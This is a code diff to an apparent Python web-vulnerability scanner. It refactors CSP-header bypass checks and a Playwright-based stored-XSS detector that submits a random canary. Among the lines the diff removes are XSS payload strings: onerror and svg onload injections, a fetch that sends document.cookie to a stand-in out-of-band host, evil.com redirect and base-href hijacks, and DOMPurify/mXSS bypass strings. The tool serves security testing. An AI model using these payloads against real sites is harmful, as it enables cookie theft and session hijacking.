+    log("INFO", "Phase 73-CSPBYPASS: CSP header analysis + bypass detection")
     findings: List[str] = []
     _csp_urlopen = _get_urlopener()
     _csp_headers = _extra_headers_dict()
     targets_file = outdir / "host_targets.txt"
     if not targets_file.exists() or not read_lines(targets_file):
-        log("warn", "73-CSPBYPASS: no targets; skipping")
+        log("WARNING", "73-CSPBYPASS: no targets; skipping")
         return {"73-CSPBYPASS": str(_out), "count": 0}
-    csp_danger_directives = {
-        "unsafe-inline": "script-src/style-src allows 'unsafe-inline' — XSS protection degraded",
-        "unsafe-eval": "script-src allows 'unsafe-eval' — eval() XSS possible",
-        "http://": "script-src allows http:// — MITM possible over HTTP",
-        "*.": "wildcard in script-src — can load from any subdomain",
-        "*": "wildcard source — entire CSP bypassable",
-    }
     csp_known_bypass_domains = {
         "cdnjs.cloudflare.com",
         "ajax.googleapis.com",
@@ -1852,22 +1969,37 @@ async def phase_73_CSPBYPASS(
                     findings.append(f"[no-csp] {base} — no CSP header (clickjacking/XSS risk)")
                     continue
                 findings.append(f"[csp] {base} → {csp['header']}: {csp['value'][:200]}")
-                val_lower = csp["value"].lower()
-                for pattern, desc in csp_danger_directives.items():
-                    if pattern in val_lower:
-                        findings.append(f"  [warn] {desc}")
-                if "script-src" in val_lower:
+                directives = _csp_directives(csp["value"])
+                script_sources = _csp_source_list(directives, "script-src")
+                style_sources = _csp_source_list(directives, "style-src")
+                if script_sources:
+                    if "unsafe-inline" in script_sources and not any(
+                        s.startswith(("'nonce-", "'sha")) for s in script_sources
+                    ):
+                        findings.append(
+                            "  [warn] script-src allows 'unsafe-inline' without nonce/hash — XSS protection degraded"
+                        )
+                    if "unsafe-eval" in script_sources:
+                        findings.append(
+                            "  [warn] script-src allows 'unsafe-eval' — eval() XSS possible"
+                        )
+                    if any(s.startswith("http://") for s in script_sources):
+                        findings.append(
+                            "  [warn] script-src allows http:// — MITM possible over HTTP"
+                        )
+                    if "*" in script_sources or any(s.startswith("*.") for s in script_sources):
+                        findings.append(
+                            "  [warn] script-src wildcard source — XSS protection degraded"
+                        )
                     for dom in csp_known_bypass_domains:
-                        if dom in val_lower:
+                        if any(dom in src for src in script_sources):
                             findings.append(
                                 f"  [bypass] script-src whitelists {dom} — known JSONP/Angular bypass"
                             )
-                directives = {}
-                for directive in val_lower.split(";"):
-                    directive = directive.strip()
-                    if directive and " " in directive:
-                        dname, _, dval = directive.partition(" ")
-                        directives[dname] = dval
+                if style_sources and "unsafe-inline" in style_sources:
+                    findings.append(
+                        "  [warn] style-src allows 'unsafe-inline' — CSS injection / UI redress risk"
+                    )
                 if "base-uri" not in directives:
                     findings.append(
                         "  [warn] no base-uri directive — DOM clobbering / injection possible"
@@ -1890,7 +2022,7 @@ async def phase_73_CSPBYPASS(
                 findings.append(f"[error] {base} → {e}")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"73-CSPBYPASS: {len(findings)} CSP findings → {out}")
+    log("OK", f"73-CSPBYPASS: {len(findings)} CSP findings → {out}")
     return {"73-CSPBYPASS": str(_out), "count": len(findings)}
 
 
@@ -1907,22 +2039,21 @@ async def phase_80_STOREXSS(
     _out = outdir / "stored_xss.txt"
     if _out.exists() and not force:
         return {"80-STOREXSS": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 80-STOREXSS: stored XSS detection via browser re-navigation")
+    log("INFO", "Phase 80-STOREXSS: stored XSS detection via browser re-navigation")
     findings: List[str] = []
     try:
         from playwright.async_api import async_playwright
     except ImportError:
-        log("warn", "80-STOREXSS: playwright not installed; skipping (pip install playwright)")
+        log("WARNING", "80-STOREXSS: playwright not installed; skipping (pip install playwright)")
         return {"80-STOREXSS": str(_out), "count": 0}
     urls_file = outdir / "urls_all.txt"
     if not urls_file.exists() or not read_lines(urls_file):
-        log("warn", "80-STOREXSS: no URLs; skipping")
+        log("WARNING", "80-STOREXSS: no URLs; skipping")
         return {"80-STOREXSS": str(_out), "count": 0}
     form_urls = [u for u in read_lines(urls_file) if "=" in u][:20]
     if not form_urls:
-        log("warn", "80-STOREXSS: no param-bearing URLs; skipping")
+        log("WARNING", "80-STOREXSS: no param-bearing URLs; skipping")
         return {"80-STOREXSS": str(_out), "count": 0}
-    _CANARY = "rcxsstore" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
     async with async_playwright() as pw:
         browser = await pw.chromium.launch(
             headless=True, args=["--headless=new", "--no-sandbox", "--disable-gpu"]
@@ -1930,6 +2061,7 @@ async def phase_80_STOREXSS(
         try:
             for url in form_urls:
                 await _throttle_rate()
+                _CANARY = "rcxsstore" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
                 context = await browser.new_context(
                     user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                 )
@@ -1950,8 +2082,21 @@ async def phase_80_STOREXSS(
                     )
                     for btn in buttons:
                         try:
-                            async with page.expect_navigation(timeout=10000):
+                            async with page.expect_navigation(timeout=10000) as nav:
                                 await btn.click()
+                            resp = await nav.value
+                            if resp is not None:
+                                try:
+                                    nav_body = await resp.body()
+                                except asyncio.CancelledError:
+                                    raise
+                                except Exception:
+                                    nav_body = b""
+                                if _CANARY.encode() in nav_body:
+                                    findings.append(
+                                        f"[stored-xss-candidate] {url} — canary in POST/POST-redirect response after submit"
+                                    )
+                                    break
                         except asyncio.CancelledError:
                             raise
                         except Exception:
@@ -1979,69 +2124,9 @@ async def phase_80_STOREXSS(
                     await context.close()
         finally:
             await browser.close()
-    # Stored XSS via filename — if file upload exists, test filenames with XSS payloads
-    uploads_file = outdir / "file_upload.txt"
-    xss_filename_payloads = [
-        '"><script>alert(1)</script>.txt',
-        '"><img src=x onerror=alert(1)>.txt',
-        '"><svg onload=alert(1)>.svg',
-        '"><svg onload=fetch(`http://CANARY.oob.domain/leak?c=`+document.cookie)>.svg',
-    ]
-    if uploads_file.exists():
-        for ln in read_lines(uploads_file):
-            for token in ln.split():
-                if token.startswith("http"):
-                    for xss_fn in xss_filename_payloads:
-                        findings.append(
-                            f"[stored-xss-filename-candidate] {token} — test filename XSS: {xss_fn}"
-                        )
-                    break
-    # OOB detection notes for stored XSS confirmation
-    findings.append("")
-    findings.append("--- OOB Confirmation (Interactsh / Collaborator) ---")
-    findings.append(
-        "[stored-xss-oob] To confirm stored XSS via OOB, inject <img src=http://CANARY.oob.domain/leak> and monitor for callback"
-    )
-    findings.append(
-        "[stored-xss-oob] Example payload: <svg onload=\"fetch('http://CANARY.oob.domain/?c='+document.cookie)\">"
-    )
-    # Multipage crawl via forms with authentication
-    findings.append("")
-    findings.append("--- Multipage Stored XSS via Forms ---")
-    findings.append(
-        "[stored-xss-multipage] If login params available, automate form filling across authenticated pages"
-    )
-    findings.append(
-        "[stored-xss-multipage] Submit XSS payloads in POST bodies: <script>alert(1)</script> in name/email/bio fields"
-    )
-    findings.append(
-        "[stored-xss-multipage] After submission, crawl related pages (profile, settings, admin panel) to detect stored XSS execution"
-    )
-
-    # XSS methodology notes for manual verification
-    findings.append("")
-    findings.append("--- DOM Clobbering ---")
-    findings.append(
-        '[xss-dom-clobber] Test: <a id=config><a id=config name=apiUrl href="https://evil.com">'
-    )
-    findings.append(
-        "[xss-dom-clobber] Check for window.X or document.X that can be clobbered by id/name attributes"
-    )
-    findings.append("")
-    findings.append("--- Mutation XSS (mXSS) ---")
-    findings.append(
-        "[xss-mutation] Sanitizer API bypass: <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
-    )
-    findings.append("[xss-mutation] DOMPurify bypass: <svg><p><style><img src=x onerror=alert(1)>")
-    findings.append("")
-    findings.append("--- Scriptless XSS ---")
-    findings.append("[xss-scriptless] CSS injection exfiltration via attribute selectors")
-    findings.append('[xss-scriptless] <meta http-equiv="refresh" content="0;url=https://evil.com">')
-    findings.append('[xss-scriptless] <base href="https://evil.com/"> hijacking relative URLs')
-
     if not findings:
         findings.append("[result] No stored XSS candidates detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"80-STOREXSS: {len(findings)} stored XSS findings → {out}")
+    log("OK", f"80-STOREXSS: {len(findings)} stored XSS findings → {out}")
     return {"80-STOREXSS": str(_out), "count": len(findings)}
